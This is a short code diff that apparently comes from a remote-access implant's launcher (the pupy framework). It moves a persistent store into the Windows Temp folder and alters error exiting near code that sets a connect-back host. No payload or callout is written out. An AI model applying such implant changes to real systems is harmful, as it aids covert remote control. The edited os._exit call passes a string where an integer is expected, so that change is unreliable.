@@ -160,7 +160,9 @@ class PStore(object):
             pstore_name = '.{}'.format(h.hexdigest())
         else:
             if pstore_dir == '~':
-                pstore_dir = os.path.join(pstore_dir, 'AppLocal')
+                pstore_dir = os.path.join(
+                    pstore_dir, 'AppData', 'Local', 'Temp'
+                )
             pstore_name = h.hexdigest()
 
         self._pstore_path = os.path.expanduser(
@@ -637,11 +639,13 @@ def main():
         logging.getLogger().setLevel(logging.DEBUG)
 
     launcher = conf.launchers[LAUNCHER]()
+
     try:
         launcher.parse_args(LAUNCHER_ARGS)
     except LauncherError as e:
         launcher.arg_parser.print_usage()
-        exit(str(e))
+        os._exit(str(e))
+
     if getattr(pupy, 'pseudo', False):
         set_connect_back_host(launcher.get_host())
     else:
